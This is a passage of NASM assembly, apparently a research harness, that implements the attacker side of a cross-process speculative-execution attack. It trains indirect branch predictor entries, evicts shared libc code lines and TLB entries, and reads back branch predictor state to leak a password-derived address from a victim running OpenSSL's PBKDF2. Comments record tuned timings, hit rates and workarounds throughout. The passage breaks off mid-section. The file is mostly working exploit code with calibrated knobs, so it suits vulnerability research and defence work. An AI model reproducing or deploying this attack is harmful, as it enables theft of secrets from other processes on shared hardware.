%include "../../nops.inc"

%define nthreads 1
%define repeat2  1               ; Repeat count for repeat macro around testcode. Default = 100
%define noptype  1

; use_spinlocks=1  -> strict turn-taking with the victim through the shared
;                     tokens. This is the configuration that is known to work;
;                     it is also required when get_higher_bits=1, because the
;                     Peek-a-Walk discovery phase needs each setup_trigger call
;                     matched by exactly one victim round.
; use_spinlocks=0  -> no victim cooperation. The attacker blocks unilaterally in
;                     ATTACKER_HANDOFF (nanosleep) instead of waiting on a token.
;
; This cannot be derived from get_higher_bits, because the victim has to agree
; on the protocol and the victim is a separate, long-lived process that knows
; nothing about the attacker's flags. Build BOTH sides with the same value: an
; attacker that never touches the tokens leaves a spinlocking victim parked
; forever, and a spinlocking attacker waits forever on a victim that never
; releases.
;
; Everything below that differs between the two modes is gated on this flag, and
; every use_spinlocks=1 path is exactly what it was when the attack was
; confirmed working. working_spinlock_baseline/ holds a frozen copy regardless.
%ifndef use_spinlocks
%define use_spinlocks 1
%endif

; Total measurement rounds, however they are distributed between the two loops.
%ifndef num_rounds
%define num_rounds 1000
%endif

; per_round=0 -> repeat0=1, repeat1=num_rounds. READ_PMC_END accumulates into
;                CustomClockResults[r14], and r14 is the repeat0 counter, so all
;                rounds sum into ONE printed value. This is the layout the
;                working spinlock configuration was calibrated against.
; per_round=1 -> repeat0=num_rounds, repeat1=1. Each round lands in its own slot
;                and the run prints a distribution instead of a sum, which is the
;                only way to see a leak that only lands in a minority of rounds.
;
; Defaults to per-round measurement exactly when the spinlocks are off, so
; use_spinlocks=1 keeps the summed layout it has always had.
%ifndef per_round
%define per_round (1 - use_spinlocks)
%endif

%if per_round
  %define repeat0 num_rounds
  %define repeat1 1
%else
  %define repeat0 1
  %define repeat1 num_rounds
%endif

; write_once=1 restructures the round loop: a single WRITE phase runs once in
; testinitc (round 0) and does exactly ONE nanosleep handoff, during which the
; victim writes E2. Every measured round (testcode) is then READ-ONLY and does
; NOT sleep, so the attacker stays on-core and the victim is starved for the
; (short) read phase -- no spinlocks, no parking, just the shipped nanosleep
; interleaving used once instead of once-per-round. per_round already defaults
; to 1 at use_spinlocks=0, so each round's timing lands in its own slot,
; revealing how long the single write survives. Default 0 = shipped
; every-round-write behaviour, baseline untouched.
%ifndef write_once
%define write_once 0
%endif

; nd_read=1 (requires write_once) swaps the READ-ONLY round's destructive
; `call start_collision` for a non-destructive squashed reader (M1b). Instead of
; walking gadget's `call[rax]` (= E2, which resolves and clobbers E2 on every
; read), it reuses the REAL fake_crypto chain for an exact PHR match and diverts
; at gadget_plt's `jmp [UserData+64]` into reader_gadget: an indirect that
; ALIASES E2's IBP index but sits behind an out-of-place-trained conditional,
; so it is reached speculatively (predicting via E2 -> the secret address, which
; is the read) and then SQUASHED before it resolves. gadget's call[rax] is never
; reached, so E2 is untouched and survives arbitrarily many reads. Because the
; PHR is a fold of every taken branch's PC and target, matching it requires
; replaying the real chain -- hence the divert-via-[UserData+64] trick rather
; than a reader built from SHIFT_PHR/SET_PHR alone. Default 0 = collapse control.
%ifndef nd_read
%define nd_read 0
%endif

; Bytes of nop between reader_gadget's squash `je` and its aliasing indirect.
; Sweeps the indirect's PC around E2's set so its IBP index collides with the
; victim gadget's call[rax] (0x43588b). Found empirically -- this is the one
; knob the M1b locate-E2 sweep turns. 0 puts the indirect in E2's own line.
%ifndef reader_align
%define reader_align 0
%endif

; Out-of-place not-taken training iterations for the reader's squash branch.
; Runs through the chain into trainer_gadget (which has NO indirect), so it
; biases the shared conditional predictor not-taken without ever touching E2.
%ifndef reader_train_count
%define reader_train_count 100
%endif

; Non-destructiveness probe: number of (squashed) reader reads to perform BEFORE
; the measured read, all after a single E2 write. If the reader is truly
; non-destructive, the measured hit rate is independent of this; if a read
; resolves and overwrites E2, any value >=1 collapses the measured rate to ~0.
%ifndef nd_pre_reads
%define nd_pre_reads 0
%endif

; Offset within UserData of reader_ibranch's INDIRECT TARGET slot. It is placed
; far from every other accessed line (+64 gadget_plt target, +128, +256/264
; timespec, +1024 condition) so the hardware prefetcher can never re-warm it:
; once clflushed+mfenced it is a guaranteed cold DRAM miss at execution. That
; makes reader_ibranch's target resolve ~300 cycles out -- long after the warm
; `je` (~6 cycles) squashes it -- so the branch is squashed BEFORE it can write
; the BTB (ScratchBPU: no write until the target resolves) = non-destructive.
%ifndef nd_target_off
%define nd_target_off 0x40000
%endif

; Per-read calls to start_dummy_ibranch (exp-06's "force ibranch prediction to
; use IBP"). A polymorphic, non-aliasing indirect whose target varies each call;
; it biases the global "consult the IBP for indirects" confidence so reader_ibranch
; predicts via E2 rather than its own last target. Runs after the cbranch retrain
; and before the read. EXPLORATORY KNOB: in this cross-process harness it is
; dose-sensitive (it shifts the working read window; see the M1b notes), so the
; default is 0 (the reader reads without it); turn it up to inspect its effect.
%ifndef nd_dummy_count
%define nd_dummy_count 0
%endif

; Out-of-place NOT-TAKEN retrainings of the squash conditional (reader_cbranch)
; performed before EACH read. The read resolves that je TAKEN and nudges its
; predictor toward taken; without re-mistraining before the next read, after a
; few reads the je predicts taken, reader_ibranch is never reached, and the read
; silently stops (the apparent "erosion" -- E2 is actually intact). This mirrors
; exp-06's per-read start_aliased_cbranch step (it uses 10). Default 10.
%ifndef nd_cbranch_retrain
%define nd_cbranch_retrain 10
%endif

; Number of training calls per round. These install E1 (the IBP entry for
; strlen@plt / gadget_plt) pointing at pkey_fake_import, which is what makes the
; victim's stalled strlen@plt speculate into the secret-carrying gadget. They
; are load-bearing and cannot be removed -- but each one also resolves
; gadget's `call [rax]` to dummy_target_0, overwriting E2, so the count trades
; off E1 training strength against how much of the round is hostile to E2.
%ifndef train_count
%define train_count 100
%endif

; Nanoseconds the attacker blocks in ATTACKER_HANDOFF when use_spinlocks=0.
; Must be < 1e9 (it is a tv_nsec) and is stored with a 32-bit immediate.
;
; The hit rate is strongly peaked in this value -- measured 0.3% at 2ms, 4.9% at
; 8ms, 55.6% at 12ms, 84.8% at 16ms, 92.8% at 24ms, 86.9% at 32ms. The default
; sits at the peak, which is roughly one whole victim round: long enough to be
; sure of spanning a gadget call, before E2 starts aging out under the victim's
; own PBKDF2 branches.
%ifndef sleep_ns
%define sleep_ns 24000000
%endif

; --- Attacker-side TLB flush of the victim's strlen@GOT page -----------------
;
; got_flush_slices > 1 subdivides ATTACKER_HANDOFF into N sleeps and evicts the
; dTLB before each one, instead of sleeping sleep_ns in a single block.
;
; Why this works, and why the alternatives do not:
;   * The stall that opens the speculation window comes from evicting the GOT
;     page's TLB entry (measured: got_stall=2 beats got_stall=1 and matches
;     clflush). It is NOT an L1D effect.
;   * The attacker cannot clflush the slot: .got is inside GNU_RELRO, written by
;     ld.so at startup, so it is a private COW page -- a different physical line
;     from the attacker's own GOT.
;   * A flusher on the SMT sibling cannot do it either: measured on the isolated
;     pair, an aggressor thrashing 2048 pages on cpu5 moves a victim on cpu4 by
;     +2.5% over a cache/port control. The dTLB is not shared across siblings.
;   * But victim and attacker share ONE core, hence one dTLB. The attacker just
;     has to be running to use it -- and at use_spinlocks=0 it is asleep for the
;     whole 24 ms the victim runs. Subdividing the sleep fixes exactly that.
;
; Budget: the victim makes ~7.6 strlen calls per 24 ms window at
; pbkdf2_iters=10000. 240 slices gives ~240 evictions against those 7.6 calls,
; so essentially every call takes a page walk. Cost is ~5% of the window in
; wakeups.
; 24 is the shipped value and is NOT a knob. It is the setting the one
; no-clflush loop-1 measurement used (got_stall=0, 120 trials: PL2 line 18 at
; sum 462, gap 232, rank 1 of 64, z=8.7). The 240-slice budget argued for just
; above is the first thing to try if loop 1 comes in thin, but 24 is what was
; actually measured. 1 restores the old single-sleep handoff, which has no
; window at all at got_stall=0.
%ifndef got_flush_slices
%define got_flush_slices 24
%endif
%ifndef got_flush_pages
%define got_flush_pages 64                ; pages per eviction pass (unrolled)
%endif

; ---------------------------------------------------------------------------
; Peek-a-Walk (get_higher_bits=1) throughput knobs.
;
; Cost is brutal here and it is entirely victim latency. One profile_cache call
; is pwsc_trials x 64 cache lines x 10 rounds x 2 phases setup/trigger pairs,
; and EVERY pair blocks for a victim gadget call. Measured against the shipped
; victim (pbkdf2_iters=10000, ~3.2 ms per PKCS5_PBKDF2_HMAC): 16 rows/s, i.e.
; ~1.3 h per profile_cache, ~4 h per find_level0_line (3 attempts), and
; leak_inst_addr_ind needs at least two of those. This is the same order with
; or without spinlocks -- the PBKDF2 latency dominates either way, so dropping
; the spinlock costs nothing in runtime.
;
; trials/threshold are a matched pair: the solver sums per-line timings across
; trials and needs the winning line to clear the runner-up by the threshold, so
; the gap scales with the trial count. pwsc.h ships the two calibrated pairings
; as NUM_TRIALS_USUAL/THRESHOLD_USUAL (128/55) and NUM_TRIALS_FAST/THRESHOLD_FAST
; (16/4); 120/25 is what this attack was tuned with. Change them together.
%ifndef pwsc_trials
%define pwsc_trials 120
%endif
%ifndef pwsc_threshold
%define pwsc_threshold 25
%endif

; BOTH phases block for the victim. The k=0 (noise) and k=1 (signal) phases run
; identically from here on: the victim thrashes the page-walk caches while it
; runs, so paying the same cost in both keeps that disturbance common-mode and
; lets it cancel in (signal - noise).
;
; Skipping the block in the noise phase would be exactly 2x faster and is sound
; in principle -- the noise phase does no training, so the victim cannot write
; the secret into E2 however long it runs, and the sleep is pure cost. It was
; never adopted because it removes the victim's cache disturbance from the noise
; baseline ONLY, which biases every line's (signal - noise) by the victim's own
; page-walk footprint. That bias is silent: it shifts the decode rather than
; breaking it. No run has ever used it.
; ---------------------------------------------------------------------------

; Attacker-side handoff. Unlike the victim these need no size padding: every
; address that has to match the victim lives in its own section pinned by
; attacker.ld, so nothing here moves them.

; Block for sleep_ns nanoseconds. This is the no-cooperation replacement for the
; spinlock: what makes the spinlock work is not that it is a lock, but that it
; takes the attacker OFF the runqueue until the victim has run. nanosleep does
; the same thing unilaterally -- the victim is then the only runnable task
; pinned to this core, so it gets the whole interval, and it never has to
; participate.
;
; The timespec lives at UserData+256 (tv_sec) / UserData+264 (tv_nsec), written
; by testinitc. UserData is 0x800000 zeroed bytes and offsets 0, 64, 128 and 512
; are the only ones already spoken for (SET_PHR, start_collision,
; dummy_target_0), so +256 is free.
%macro ATTACKER_SLEEP 0
    mov eax, 35                       ; __NR_nanosleep
    lea rdi, [rel UserData+256]       ; struct timespec *req
    xor esi, esi                      ; rem = NULL; an EINTR just means we
                                      ; resume early, which is harmless here
    syscall                           ; clobbers rax, rcx, r11
%endmacro

; Touch got_flush_pages distinct pages, one line each, to evict the dTLB by
; capacity. Attacker's own memory; needs no address of the victim's. r10 is
; free here (r11/rcx are syscall-clobbered, rax/rbx/rdi are in use around the
; handoff), and this runs entirely outside any measured region.
%macro TLB_EVICT 0
    ; Straight-line, NO branches: a loop here would push taken branches into the
    ; PHR that start_collision depends on. Unrolled, so got_flush_pages x
    ; got_flush_slices is the instruction budget -- keep the product modest.
    ; rax/r10 are saved rather than assumed dead; this is outside every measured
    ; region so the stack traffic costs nothing.
    push rax
    push r10
    lea r10, [rel tlb_evict_buf]
    %assign tlb_i 0
    %rep got_flush_pages
      mov al, [r10 + tlb_i * 4096]
      %assign tlb_i tlb_i + 1
    %endrep
    pop r10
    pop rax
%endmacro

; One handoff: either the shipped single sleep, or N x (evict, short sleep).
%macro ATTACKER_HANDOFF_SLEEP 0
  %if got_flush_slices <= 1
    ATTACKER_SLEEP
  %else
    %rep got_flush_slices
      TLB_EVICT
      ATTACKER_SLEEP
    %endrep
  %endif
%endmacro

; Take our own token, i.e. wait until it is our turn. With no spinlocks there is
; nothing to wait for at the top of the round -- ATTACKER_HANDOFF does all the
; waiting -- so this collapses to nothing rather than burning a syscall.
%macro ATTACKER_ACQUIRE 0
  %if use_spinlocks
  %%spin:
    mov   eax, 1
    mov   rbx, [PSharedMemory2]
    xchg  eax, dword[rbx]
    test  eax, eax
    jnz   %%spin
  %endif
%endmacro

; Give the victim the core and do not come back until it has had a real chance
; to run. The fences keep the training above ordered ahead of the handoff.
;
; This is the one site that decides whether the attack works. The victim's
; write to E2 must land after our last training call and before our measuring
; call, and this is that gap. use_spinlocks=1 makes the gap exact (wait for the
; victim's release store); use_spinlocks=0 makes it a fixed interval long
; enough to span at least one victim gadget call, and relies on sampling many
; rounds to catch the good phases.
%macro ATTACKER_HANDOFF 0
    SERIALIZE
    mfence
  %if use_spinlocks
    mov rbx, [PSharedMemory]          ; release victim lock
    mov dword[rbx], 0                 ; store-release (not `dec`): a `dec` on a
                                      ; still-0 lock is what wedged both procs
                                      ; in the original livelock.
  %%spin:
    mov eax, 1
    mov rbx, [PSharedMemory2]
    xchg eax, dword[rbx]
    test eax, eax
    jnz %%spin
  %else
    ATTACKER_HANDOFF_SLEEP
  %endif
%endmacro

; End of round: drop our own token. The acquire at the top of the next round
; re-takes it immediately; the real interlock is ATTACKER_HANDOFF. With no
; spinlocks there is no token to drop, so only the fences remain.
%macro ATTACKER_RELEASE 0
    SERIALIZE
    mfence
  %if use_spinlocks
    mov rbx, [PSharedMemory2]         ; release attacker lock
    mov dword[rbx], 0                 ; store-release, see above
  %endif
%endmacro

%macro testinit1 0
  %rep get_higher_bits
    push rdi ; Save all registers we will mangle
    push rsi
    push rdx
    push rcx
    push r8
    push r9
    sub rsp, 8

    ; The template runs testinit1 BEFORE the first testinitc (TEST_LOOP_2), so
    ; everything setup_trigger depends on has to be established here too --
    ; testinitc is far too late to help Peek-a-Walk. Duplicated rather than
    ; hoisted because testinitc still has to re-do it for the testcode path,
    ; which runs get_higher_bits=0 builds where testinit1 is empty.
    ;
    ; 1. Resolve strlen. FLUSH_VICTIM_STRLEN dereferences this GOT slot to reach
    ;    the shared libc code page; left unresolved it still points at the PLT
    ;    resolver stub, so the flush lands on the wrong lines entirely.
    mov rdi, SecretString
    call strlen

    ; 2. ATTACKER_SLEEP's timespec. UserData is zeroed, so without this every
    ;    use_spinlocks=0 handoff inside setup_trigger asks nanosleep for 0 ns
    ;    and returns immediately: the victim never gets the core, never reaches
    ;    the stalled strlen@plt, and E2 never receives the secret. Peek-a-Walk
    ;    then measures nothing but noise in both phases.
    mov qword [rel UserData+256], 0           ; tv_sec
    mov qword [rel UserData+264], sleep_ns / got_flush_slices  ; tv_nsec

    call evict_dsb

    lea rdi, [rel setup_trigger]
    xor rsi, rsi
    lea rdx, [rel trigger]
    lea rcx, [rel MEMORY_MAP_ORDER_ORACLE_EVICT_SIZES]
    mov r8, pwsc_threshold  ; sum threshold for the Peek-a-Walk solver
    mov r9, pwsc_trials     ; trials per profile_cache call

    call pwsc_init_reset

    mov rdi, secret_value
    lea rsi, [rel init_noise_filter]
    xor rdx, rdx
    lea rcx, [rel setup_trigger]
    lea r8, [rel trigger]

    call leak_inst_addr_ind


    %rep 512
      nop
    %endrep

    add rsp, 8

    pop r9 ; Save all registers we will mangle
    pop r8
    pop rcx
    pop rdx
    pop rsi
    pop rdi

  %endrep
%endmacro

%macro testinitc 0              ; Macro to call in each test before reading counters.
    mov dword[PrintCustomPMC], 1

    lea rax, [UserData]
    mov [UserDataPtr], rax

    lea rax, [UserDataPtr]
    mov [UserDataPtrPtr], rax

    lea rax, [UserDataPtrPtr]
    mov [UserDataPtrPtrPtr], rax

    ; Resolve strlen in this process too. We never speculate through our own
    ; strlen@plt, but FLUSH_VICTIM_STRLEN below dereferences this GOT slot to
    ; reach the libc code page, which is physically shared with the victim.
    mov rdi, SecretString
    call strlen

    ; timespec for ATTACKER_SLEEP. Written here rather than assembled as data so
    ; it needs no section of its own in attacker.ld.
    mov qword [rel UserData+256], 0           ; tv_sec
    mov qword [rel UserData+264], sleep_ns / got_flush_slices  ; tv_nsec (< 1e9)

  %if use_spinlocks
    ; Re-establish the shared cross-process lock state from the ATTACKER side.
    ; The victim seeds these once in its own testinitc at launch, but the victim
    ; runs forever and is never restarted, so on every attacker run after the
    ; first the locks are stale. Reset to the known start state here (mirrors
    ; victim.nasm testinitc): attacker token held, victim token free.
    ;
    ; Only on the first repetition. testinitc runs once per repeat0 iteration,
    ; and with per_round=1 that is every round -- resetting mid-run would stomp
    ; a handoff already in flight. r14d is the repeat0 counter (the template
    ; sets it before TEST_LOOP_2); we only read it.
    cmp r14d, 0
    jne %%skip_lock_reset
    mov rbx, [PSharedMemory2]
    mov dword[rbx], 1                 ; attacker token = held  -> attacker waits its turn
    mov rbx, [PSharedMemory]
    mov dword[rbx], 0                 ; victim token   = free  -> parked victim takes first turn
    mfence
  %%skip_lock_reset:
  %endif

  %if write_once
    ; --- One-time WRITE phase (round 0 only) --------------------------------
    ; Train E1 once, flush the shared strlen code, and hand off to the victim a
    ; single time via the nanosleep ATTACKER_HANDOFF. The attacker is off-core
    ; for sleep_ns while the victim speculates into the gadget and writes the
    ; secret into E2. Every later round never sleeps, so the attacker holds the
    ; core and the victim gets no (or negligible) time to write again. Runs
    ; before READ_PMC_START, so it is untimed.
    cmp r14d, 0
    jne %%skip_write_once
    SERIALIZE_OPT
    %rep train_count
      call start_collision
    %endrep
    SERIALIZE_OPT
    FLUSH_VICTIM_STRLEN
    SERIALIZE_OPT
    ATTACKER_HANDOFF
    SERIALIZE_OPT
  %%skip_write_once:
  %endif
%endmacro

%macro testcode 0               ; A multi-line macro executing any piece of test code.
%if write_once
    ; --- READ-ONLY round ----------------------------------------------------
    ; E2 was written once in testinitc (round 0). No acquire, no training, no
    ; handoff -- the victim is parked.
  %if nd_read
    ; Non-destructive squashed read (M1b). Expected signature across rounds:
    ; round 0 AND later rounds both high and FLAT (the single write survives
    ; every read). Contrast the collapse control below, which decays to the
    ; noise floor after round 0 because its read resolves E2.
    ;
    ; Step 1 - out-of-place train the squash branch not-taken. Condition = 0, so
    ; the chain walks into trainer_gadget (no indirect) and biases the shared
    ; conditional predictor without touching E2's IBP entry.
    mov qword [rel UserData+1024], 0
    SERIALIZE_OPT
    %rep reader_train_count
      call start_reader_train
    %endrep
    SERIALIZE_OPT

    ; Step 2 - the measured non-destructive read. Condition = 1 (taken) but
    ; flushed by start_reader, so reader_gadget's `je` stalls, is predicted
    ; not-taken, falls through to the aliasing indirect (which predicts via E2 =
    ; the secret address -> speculative fetch there = the read), then resolves
    ; taken and squashes the indirect before it can overwrite E2.
    mov qword [rel UserData+1024], 1
    mov r8, strict qword malicious_target_0
    clflush [r8]
    mov r8, strict qword align_target
    clflush [r8]
    lea r8, [rel UserData+1024]
    clflush [r8]

    SERIALIZE_OPT

    call start_reader

    SERIALIZE_OPT

    %if leak_final_6
      mov r8, strict qword align_target
    %else
      mov r8, strict qword malicious_target_0
    %endif

    READ_PMC_START
      mov r9, [r8]
    READ_PMC_END

   %rep 512
     nop
    %endrep
  %else
    ; Collapse control: the SAME destructive `call start_collision` as the
    ; baseline. It resolves E2 to dummy after reading, so with one write the
    ; signal appears only in round 0 and decays to the noise floor afterwards.
    ; This is the baseline the nd_read flat curve is measured against.
    mov r8, strict qword malicious_target_0
    clflush [r8]
    mov r8, strict qword align_target
    clflush [r8]

    SERIALIZE_OPT

    call start_collision

    SERIALIZE_OPT

    %if leak_final_6
      mov r8, strict qword align_target
    %else
      mov r8, strict qword malicious_target_0
    %endif

    READ_PMC_START
      mov r9, [r8]
    READ_PMC_END

   %rep 512
     nop
    %endrep
  %endif
%else
    ATTACKER_ACQUIRE

    SERIALIZE_OPT

    ; Train E1 (gadget_plt -> gadget, i.e. strlen@plt -> pkey_fake_import) so the
    ; victim's stalled strlen@plt speculates into the secret-carrying gadget.
    ; Necessary; also the reason E2 is hostile territory for most of the round.
    %rep train_count
      call start_collision
    %endrep

    SERIALIZE_OPT

    FLUSH_VICTIM_STRLEN

    SERIALIZE_OPT

    ; Hand the turn to the writer so it can write the IBP. The strlen code lines
    ; flushed just above stay flushed across the handoff, which is what stalls
    ; the victim's strlen@plt.
    ATTACKER_HANDOFF

    ; .sec_malicious_target is linked at the CANDIDATE SECRET ADDRESS, which can
    ; sit more than 2 GiB from .text -- 0xdeadbeef is 3.46 GiB out, and .text
    ; cannot follow it because .sec_gadget/.sec_fake_* are pinned to the
    ; victim's OpenSSL addresses. RIP-relative operands are R_X86_64_PC32 and
    ; truncate at link time, so both addresses are materialised as 64-bit
    ; absolutes and referenced indirectly. Reloaded after start_collision
    ; because the collision path does not preserve r8/r14.
    ; Only r8 is safe here: READ_PMC_START uses r13, and READ_PMC_END uses r13
    ; AND r14 as the counter index (`add %eax,0x1fc(%r13,%r14,4)`), so parking
    ; an address in r14 segfaults. r8 is touched by neither. The clflushes are
    ; outside the timed region, so one register can serve both addresses.
  %if nd_read
    ; RELIABLE reader test: the victim wrote E2 this round (per-round handoff).
    ; Each read is preceded by nd_cbranch_retrain out-of-place NOT-TAKEN trainings
    ; of the squash conditional (reader_cbranch via trainer_gadget), because the
    ; read resolves that je TAKEN and biases it toward taken. Re-mistraining
    ; before every read keeps it predicted not-taken, so reader_ibranch keeps
    ; being reached (and squashed) -> E2 read many times, non-destructively.
    %rep nd_pre_reads
      mov qword [rel UserData+1024], 0        ; not-taken outcome for training
      SERIALIZE_OPT
      %rep nd_cbranch_retrain
        call start_reader_train
      %endrep
      %rep nd_dummy_count                      ; force ibranch pred -> consult IBP
        rdrand rdx
        and rdx, 1
        mov qword [rel UserData+200], rdx
        SERIALIZE_OPT
        call start_dummy_ibranch
      %endrep
      mov qword [rel UserData+1024], 1        ; taken (warm) at read time -> squash
      SERIALIZE_OPT
      call start_reader
      SERIALIZE_OPT
    %endrep
    ; The measured read: same retrain-then-read, with the clflush + READ_PMC.
    mov qword [rel UserData+1024], 0
    SERIALIZE_OPT
    %rep nd_cbranch_retrain
      call start_reader_train
    %endrep
    %rep nd_dummy_count
      rdrand rdx
      and rdx, 1
      mov qword [rel UserData+200], rdx
      SERIALIZE_OPT
      call start_dummy_ibranch
    %endrep
    mov qword [rel UserData+1024], 1
    mov r8, strict qword malicious_target_0
    clflush [r8]
    mov r8, strict qword align_target
    clflush [r8]
    SERIALIZE_OPT
    call start_reader
    SERIALIZE_OPT
    %if leak_final_6
      mov r8, strict qword align_target
    %else
      mov r8, strict qword malicious_target_0
    %endif
    READ_PMC_START
      mov r9, [r8]
    READ_PMC_END
  %else
    mov r8, strict qword malicious_target_0
    clflush [r8]
    mov r8, strict qword align_target
    clflush [r8]

    SERIALIZE_OPT

    call start_collision

    SERIALIZE_OPT

    %if leak_final_6
      mov r8, strict qword align_target
    %else
      mov r8, strict qword malicious_target_0
    %endif

    READ_PMC_START
      mov r9, [r8]
    READ_PMC_END
  %endif

    ATTACKER_RELEASE

   %rep 512
     nop
    %endrep
%endif

%endmacro

; libc is mapped from the same physical pages in both processes, so evicting
; the strlen code lines here also evicts them for the victim. That keeps the
; victim's stalled strlen@plt from resolving early and widens the speculation
; window in which pkey_fake_import writes the secret into the IBP. The victim
; flushes its own (private) GOT slot; this flushes the (shared) code.
%macro FLUSH_VICTIM_STRLEN 0
    mov rax, [rel strlen wrt ..got]
    clflush [rax]
    clflush [rax + 64]
    clflush [rax + 128]
%endmacro

%macro SHIFT_PHR 2
    mov rax, %1
    jmp shift_phr_%+ %2
    align 1<<16
    %rep (1<<16)-64
     nop
    %endrep
    shift_phr_%+ %2:
    %rep 64-8
     nop
    %endrep
    dec rax
    cmp rax, 0
    jg shift_phr_%+ %2
%endmacro

%macro SERIALIZE_OPT 0
    mfence
    xor eax, eax
    cpuid
%endmacro

%macro SCHED_YIELD 0                ; give up the CPU: sched_yield() = syscall 24.
    mov eax, 24                     ; clobbers rcx/r11 (syscall) and rax (retval);
    syscall                         ; none are live here before the measure.
%endmacro

%macro SET_PHR_EVEN 1
    cmp rdx, 1
    %rep 50
     nop
    %endrep
    je set_phr_even_%+ %1
    align 1<<6
    set_phr_even_%+ %1:
    %rep 77H
     nop
    %endrep
%endmacro

%macro SET_PHR 2
    %assign i 0
    %rep %1
        cmp qword[UserData], 1
        je set_phr_eq_%+ %2_%+ i
        %rep 64
         nop
        %endrep
        set_phr_eq_%+ %2_%+ i:
        %rep 64
         nop
        %endrep
        %assign i i+1
    %endrep
%endmacro

section .sec_collision exec
start_collision:
    SHIFT_PHR 195, 0
    SET_PHR 50, 0
    SERIALIZE_OPT

collision_ibranch_pc:
    %rep 16
      nop
    %endrep
    mov qword [rel UserData+64], gadget          ; gadget_plt's indirect target
    mov qword [rel UserData+128], dummy_target_0 ; what gadget's `call [rax]` takes
    lea rdi, [rel UserData+128]
    call fake_crypto_1
    %rep 512
      nop
    %endrep
    ret

; Mirrors strlen@plt @ 0x4031a0 in the victim: `jmp *strlen@GOT(%rip)`.
; This is the branch the victim stalls; training it here points its IBP entry
; at gadget (= pkey_fake_import in the victim).
section .sec_gadget_plt exec
gadget_plt:
    jmp [UserData+64]
    %rep 512
      nop
    %endrep
    ret

%rep 512
  nop
%endrep

; Mirrors pkey_fake_import @ 0x4358e0 in the victim:
;   4358e0: push %rax            (1B)   -> nop here, we do not need the slot
;   4358e1: mov  %rdi,%rax       (3B)
;   4358e4: mov  0x8(%rdi),%rsi  (4B)
;   4358e8: mov  %rdx,%rdi       (3B)
;   4358eb: call *(%rax)                <-- the secret-carrying indirect branch
; In the victim this executes speculatively with rax = rdi = password, so the
; IBP entry for 0x4358eb is written with *password, i.e. the secret. Here we
; read that entry back: architecturally we go to dummy_target_0, speculatively
; to the secret address.
section .sec_gadget exec
gadget:
    nop
    mov rax, rdi
    mov rsi, [rdi+8]
    mov rdx, rdi
    call [rax]
    %rep 512
      nop
    %endrep
   ret

%rep 512
  nop
%endrep

section .sec_dummy_target_0 exec
dummy_target_0:
mov r9, [UserData+512]
%rep 100
  nop
%endrep
ret

%rep 512
  nop
%endrep

; Linked at the candidate secret address. num_align nops place the `jmp
; align_target` at exactly one of the 64 offsets in the line, so the sweep over
; num_align resolves the bottom 6 bits: only when num_align matches the low
; bits of the secret does the speculative fetch land on the jump and pull
; align_target into the cache.
section .sec_malicious_target exec
malicious_target_0:
    %rep num_align
      nop
    %endrep
    jmp align_target
    %rep 512
      nop
    %endrep
    ret

%rep 512
  nop
%endrep

; Mirrors PKCS5_PBKDF2_HMAC @ 0x407b70 in the victim.
; Taken branches reproduced: 0x407b8f call ossl_pkcs5_pbkdf2_hmac_ex.
section .sec_fake_crypto_1 exec
fake_crypto_1:
  %rep 31
    nop
  %endrep
%if ($ - fake_crypto_1) != 0x1f
  %error "fake_crypto_1: call ossl_pkcs5_pbkdf2_hmac_ex not at 0x407b8f"
%endif
  call fake_crypto_2
  %rep 100
    nop
  %endrep
  ret


; Mirrors ossl_pkcs5_pbkdf2_hmac_ex @ 0x407930 in the victim.
; Taken branches reproduced: 0x40795c call, 0x407981 je, 0x40798b call.
section .sec_fake_crypto_2 exec
fake_crypto_2:
  %rep 0x2c                             ; 0x407930 -> 0x40795c
    nop
  %endrep
%if ($ - fake_crypto_2) != 0x2c
  %error "fake_crypto_2: call EVP_MD_get0_name not at 0x40795c"
%endif
  call fake_evp_md_get0_name            ; 0x40795c (5B), returns to 0x407961
  %rep 0x20                             ; 0x407961 -> 0x407981
    nop
  %endrep
%if ($ - fake_crypto_2) != 0x51
  %error "fake_crypto_2: je not at 0x407981"
%endif
  jmp  short further ; 01 02 03         ; 0x407981 (2B) -> 0x407988
  nop
  nop
  nop
  nop
  nop
further:                                ; 0x407988
  nop
  nop
  nop
%if ($ - fake_crypto_2) != 0x5b
  %error "fake_crypto_2: call strlen@plt not at 0x40798b"
%endif
  call gadget_plt                       ; 0x40798b -> 0x4031a0
  %rep 100
    nop
  %endrep
  ret

; Mirrors EVP_MD_get0_name @ 0x42d2f0 in the victim.
; md->type_name is NULL for the legacy static sha256_md returned by
; EVP_sha256(), so the je at 0x42d2fd is taken and control falls through
; into OBJ_nid2sn(NID_sha256).
; Taken branches reproduced: 0x42d2fd je, 0x42d307 call, 0x42d30d ret.
section .sec_fake_evp_md_get0_name exec
fake_evp_md_get0_name:                  ; 0x42d2f0
  %rep 13                               ; 0x42d2f0 -> 0x42d2fd
    nop
  %endrep
%if ($ - fake_evp_md_get0_name) != 0xd
  %error "fake_evp_md_get0_name: je not at 0x42d2fd"
%endif
  jmp  short femd_305                   ; 0x42d2fd (2B, eb 06) -> 0x42d305
  %rep 6                                ; jumped over
    nop
  %endrep
femd_305:                               ; 0x42d305
  nop
  nop
%if ($ - fake_evp_md_get0_name) != 0x17
  %error "fake_evp_md_get0_name: call OBJ_nid2sn not at 0x42d307"
%endif
  call fake_obj_nid2sn                  ; 0x42d307 (5B), returns to 0x42d30c
  nop                                   ; 0x42d30c
%if ($ - fake_evp_md_get0_name) != 0x1d
  %error "fake_evp_md_get0_name: ret not at 0x42d30d"
%endif
  ret                                   ; 0x42d30d -> 0x407961

; Mirrors OBJ_nid2obj @ 0x40b160 and OBJ_nid2sn @ 0x40b290 in the victim.
; Both live in one section: they are only 0x130 apart and share a page.
; nid_objs[672].nid == 672, so OBJ_nid2obj takes the static-table fast path
; (no lock, no LHASH, no allocation).
; Taken branches reproduced: 0x40b19a jmp, 0x40b25f ret, 0x40b291 call,
; 0x40b29f ret.
section .sec_fake_obj exec
fake_obj_nid2obj:                       ; 0x40b160
  %rep 0x3a                             ; 0x40b160 -> 0x40b19a
    nop
  %endrep
%if ($ - fake_obj_nid2obj) != 0x3a
  %error "fake_obj_nid2obj: jmp not at 0x40b19a"
%endif
  jmp  near fo_257                      ; 0x40b19a (5B, e9 b8 00 00 00)
  %rep 0xb8                             ; jumped over
    nop
  %endrep
fo_257:                                 ; 0x40b257
  %rep 8
    nop
  %endrep
%if ($ - fake_obj_nid2obj) != 0xff
  %error "fake_obj_nid2obj: ret not at 0x40b25f"
%endif
  ret                                   ; 0x40b25f -> 0x40b296
  %rep 0x30                             ; unreachable padding
    nop
  %endrep
fake_obj_nid2sn:                        ; 0x40b290
  nop
%if ($ - fake_obj_nid2obj) != 0x131
